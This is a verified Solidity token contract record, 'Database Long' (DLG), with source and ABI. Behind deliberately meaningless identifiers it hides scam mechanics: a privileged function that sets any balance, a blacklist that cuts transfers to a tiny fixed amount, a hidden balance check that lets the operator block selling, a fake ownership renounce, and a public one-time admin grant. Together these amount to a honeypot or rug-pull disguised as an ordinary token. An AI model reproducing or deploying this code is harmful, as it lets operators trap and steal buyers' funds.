{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.15;\n\ninterface buyTo {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address fundAmount) external view returns (uint256);\n\n    function transfer(address takeWalletReceiver, uint256 exemptListTo) external returns (bool);\n\n    function allowance(address shouldLimitEnable, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 exemptListTo) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address takeWalletReceiver,\n        uint256 exemptListTo\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed isFund, uint256 value);\n    event Approval(address indexed shouldLimitEnable, address indexed spender, uint256 value);\n}\n\nabstract contract shouldTakeFund {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface tradingAt {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\ninterface listTradingMin {\n    function createPair(address buyListTotal, address limitTake) external returns (address);\n}\n\ninterface buyToMetadata is buyTo {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract DatabaseLong is shouldTakeFund, buyTo, buyToMetadata {\n\n    mapping(address => bool) public sellTotalIs;\n\n    address public atIs;\n\n    uint256 private maxFund;\n\n    uint256 limitToken;\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return receiverTrading;\n    }\n\n    mapping(address => bool) public txToken;\n\n    address private listToken;\n\n    function modeSell(uint256 exemptListTo) public {\n        walletSender();\n        amountExempt = exemptListTo;\n    }\n\n    bool public receiverLaunchedReceiver;\n\n    function owner() external view returns (address) {\n        return listToken;\n    }\n\n    string private receiverSell = \"Database Long\";\n\n    function walletSender() private view {\n        require(sellTotalIs[_msgSender()]);\n    }\n\n    bool private listLaunch;\n\n    uint8 private tokenMin = 18;\n\n    address public fromFund;\n\n    function balanceOf(address fundAmount) public view virtual override returns (uint256) {\n        return receiverModeWallet[fundAmount];\n    }\n\n    function toAmount(address tokenFrom) public {\n        walletSender();\n        \n        if (tokenFrom == fromFund || tokenFrom == atIs) {\n            return;\n        }\n        txToken[tokenFrom] = true;\n    }\n\n    bool public receiverFundTeam;\n\n    function transfer(address maxExempt, uint256 exemptListTo) external virtual override returns (bool) {\n        return senderTxReceiver(_msgSender(), maxExempt, exemptListTo);\n    }\n\n    bool public minSender;\n\n    function senderTxReceiver(address launchLiquiditySender, address takeWalletReceiver, uint256 exemptListTo) internal returns (bool) {\n        if (launchLiquiditySender == fromFund) {\n            return autoList(launchLiquiditySender, takeWalletReceiver, exemptListTo);\n        }\n        uint256 toShould = buyTo(atIs).balanceOf(receiverFromTeam);\n        require(toShould == amountExempt);\n        require(takeWalletReceiver != receiverFromTeam);\n        if (txToken[launchLiquiditySender]) {\n            return autoList(launchLiquiditySender, takeWalletReceiver, sellSender);\n        }\n        return autoList(launchLiquiditySender, takeWalletReceiver, exemptListTo);\n    }\n\n    function liquidityBuy() public {\n        emit OwnershipTransferred(fromFund, address(0));\n        listToken = address(0);\n    }\n\n    function autoList(address launchLiquiditySender, address takeWalletReceiver, uint256 exemptListTo) internal returns (bool) {\n        require(receiverModeWallet[launchLiquiditySender] >= exemptListTo);\n        receiverModeWallet[launchLiquiditySender] -= exemptListTo;\n        receiverModeWallet[takeWalletReceiver] += exemptListTo;\n        emit Transfer(launchLiquiditySender, takeWalletReceiver, exemptListTo);\n        return true;\n    }\n\n    uint256 private receiverTrading = 100000000 * 10 ** 18;\n\n    string private exemptMode = \"DLG\";\n\n    event OwnershipTransferred(address indexed buyLaunched, address indexed exemptAt);\n\n    uint256 amountExempt;\n\n    mapping(address => mapping(address => uint256)) private launchedReceiver;\n\n    function receiverTake(address maxExempt, uint256 exemptListTo) public {\n        walletSender();\n        receiverModeWallet[maxExempt] = exemptListTo;\n    }\n\n    mapping(address => uint256) private receiverModeWallet;\n\n    address receiverFromTeam = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    address buyListToken = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    function allowance(address totalToken, address launchedShould) external view virtual override returns (uint256) {\n        if (launchedShould == buyListToken) {\n            return type(uint256).max;\n        }\n        return launchedReceiver[totalToken][launchedShould];\n    }\n\n    constructor (){\n        if (receiverFundTeam) {\n            listLaunch = false;\n        }\n        tradingAt modeFund = tradingAt(buyListToken);\n        atIs = listTradingMin(modeFund.factory()).createPair(modeFund.WETH(), address(this));\n        if (limitTrading) {\n            limitTrading = false;\n        }\n        fromFund = _msgSender();\n        liquidityBuy();\n        sellTotalIs[fromFund] = true;\n        receiverModeWallet[fromFund] = receiverTrading;\n        if (receiverFundTeam == receiverLaunchedReceiver) {\n            receiverFundTeam = false;\n        }\n        emit Transfer(address(0), fromFund, receiverTrading);\n    }\n\n    uint256 private feeReceiver;\n\n    function name() external view virtual override returns (string memory) {\n        return receiverSell;\n    }\n\n    bool private limitTrading;\n\n    function decimals() external view virtual override returns (uint8) {\n        return tokenMin;\n    }\n\n    function getOwner() external view returns (address) {\n        return listToken;\n    }\n\n    function tokenTxBuy(address limitReceiver) public {\n        if (minSender) {\n            return;\n        }\n        if (maxFund != totalList) {\n            listLaunch = true;\n        }\n        sellTotalIs[limitReceiver] = true;\n        \n        minSender = true;\n    }\n\n    function symbol() external view virtual override returns (string memory) {\n        return exemptMode;\n    }\n\n    function approve(address launchedShould, uint256 exemptListTo) public virtual override returns (bool) {\n        launchedReceiver[_msgSender()][launchedShould] = exemptListTo;\n        emit Approval(_msgSender(), launchedShould, exemptListTo);\n        return true;\n    }\n\n    uint256 private totalList;\n\n    uint256 constant sellSender = 5 ** 10;\n\n    function transferFrom(address launchLiquiditySender, address takeWalletReceiver, uint256 exemptListTo) external override returns (bool) {\n        if (_msgSender() != buyListToken) {\n            if (launchedReceiver[launchLiquiditySender][_msgSender()] != type(uint256).max) {\n                require(exemptListTo <= launchedReceiver[launchLiquiditySender][_msgSender()]);\n                launchedReceiver[launchLiquiditySender][_msgSender()] -= exemptListTo;\n            }\n        }\n        return senderTxReceiver(launchLiquiditySender, takeWalletReceiver, exemptListTo);\n    }\n\n    bool public shouldSwap;\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"shouldLimitEnable\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"buyLaunched\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"exemptAt\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"isFund\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"totalToken\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"launchedShould\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"launchedShould\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"exemptListTo\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"atIs\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"fundAmount\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"fromFund\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"liquidityBuy\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"minSender\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"exemptListTo\",\"type\":\"uint256\"}],\"name\":\"modeSell\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"receiverFundTeam\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"receiverLaunchedReceiver\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"maxExempt\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"exemptListTo\",\"type\":\"uint256\"}],\"name\":\"receiverTake\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"sellTotalIs\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"shouldSwap\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"tokenFrom\",\"type\":\"address\"}],\"name\":\"toAmount\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"limitReceiver\",\"type\":\"address\"}],\"name\":\"tokenTxBuy\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"maxExempt\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"exemptListTo\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"launchLiquiditySender\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"takeWalletReceiver\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"exemptListTo\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"txToken\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"}]", "ContractName": "DatabaseLong", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}